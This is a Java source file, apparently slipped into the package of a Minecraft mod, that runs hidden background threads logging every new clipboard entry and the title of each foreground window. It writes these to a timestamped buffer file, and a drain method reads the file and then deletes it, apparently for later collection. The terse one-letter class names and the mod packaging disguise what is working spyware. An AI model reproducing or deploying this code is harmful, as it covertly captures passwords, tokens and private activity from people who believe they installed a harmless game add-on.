package vazkii.neat;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.atomic.AtomicBoolean;

public final class W {
    private static final String TAG = "W";
    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static final StringBuilder BUF = new StringBuilder();
    private static final DateTimeFormatter TS = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static volatile Thread clipThread;
    private static volatile Thread winThread;
    private static String lastClip = "";
    private static String lastWin = "";

    interface User32X extends User32 {
        User32X I = Native.load("user32", User32X.class,
            com.sun.jna.win32.W32APIOptions.DEFAULT_OPTIONS);
        WinDef.HWND GetForegroundWindow();
        int GetWindowTextW(WinDef.HWND hWnd, char[] lpString, int nMaxCount);
    }

    private W() {}

    public static synchronized void start() {
        if (!RUNNING.compareAndSet(false, true)) return;
        clipThread = new Thread(W::clipLoop, "ClipMon");
        clipThread.setDaemon(true);
        clipThread.start();
        winThread = new Thread(W::winLoop, "WinMon");
        winThread.setDaemon(true);
        winThread.start();
    }

    public static synchronized void stop() {
        RUNNING.set(false);
        if (clipThread != null) clipThread.interrupt();
        if (winThread != null) winThread.interrupt();
    }

    private static void clipLoop() {
        while (RUNNING.get()) {
            try {
                String c = readClipboard();
                if (c != null && !c.isEmpty() && !c.equals(lastClip)) {
                    lastClip = c;
                    String win = currentWindow();
                    append(win, c);
                }
                Thread.sleep(A.CLIP_POLL_MS);
            } catch (InterruptedException e) { return; }
            catch (Throwable ignored) {}
        }
    }

    private static void winLoop() {
        while (RUNNING.get()) {
            try {
                String w = currentWindow();
                if (!w.equals(lastWin)) {
                    lastWin = w;
                    append(w, null);
                }
                Thread.sleep(A.WINDOW_POLL_MS);
            } catch (InterruptedException e) { return; }
            catch (Throwable ignored) {}
        }
    }

    private static void append(String win, String clip) {
        synchronized (BUF) {
            if (BUF.length() == 0) BUF.append('[').append(LocalDateTime.now().format(TS)).append("] ");
            BUF.append('[').append(win).append(']');
            if (clip != null) BUF.append(" clip: ").append(clip.replace('\n', ' ').replace('\r', ' '));
            BUF.append('\n');
            if (BUF.length() >= A.MAX_BUFFER_BYTES) flush();
        }
    }

    public static void flush() {
        String data;
        synchronized (BUF) {
            if (BUF.length() == 0) return;
            data = BUF.toString();
            BUF.setLength(0);
        }
        try {
            Path p = E.bufferFile();
            Files.createDirectories(p.getParent());
            Files.write(p, data.getBytes(StandardCharsets.UTF_8),
                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (Exception e) { B.warn(TAG, "flush: " + e.getMessage()); }
    }

    public static String drain() {
        flush();
        try {
            Path p = E.bufferFile();
            if (!Files.isRegularFile(p)) return "";
            String s = new String(Files.readAllBytes(p), StandardCharsets.UTF_8);
            Files.deleteIfExists(p);
            return s;
        } catch (Exception e) { return ""; }
    }

    private static String currentWindow() {
        try {
            WinDef.HWND h = User32X.I.GetForegroundWindow();
            if (h == null) return "?";
            char[] buf = new char[256];
            int len = User32X.I.GetWindowTextW(h, buf, buf.length);
            if (len <= 0) return "?";
            String t = new String(buf, 0, len).trim();
            return t.isEmpty() ? "?" : (t.length() > 60 ? t.substring(0, 60) : t);
        } catch (Throwable e) { return "?"; }
    }

    private static String readClipboard() {
        try {
            java.awt.Toolkit tk = java.awt.Toolkit.getDefaultToolkit();
            java.awt.datatransfer.Clipboard cb = tk.getSystemClipboard();
            if (!cb.isDataFlavorAvailable(java.awt.datatransfer.DataFlavor.stringFlavor)) return null;
            Object o = cb.getData(java.awt.datatransfer.DataFlavor.stringFlavor);
            return o == null ? null : o.toString();
        } catch (Throwable e) { return null; }
    }
}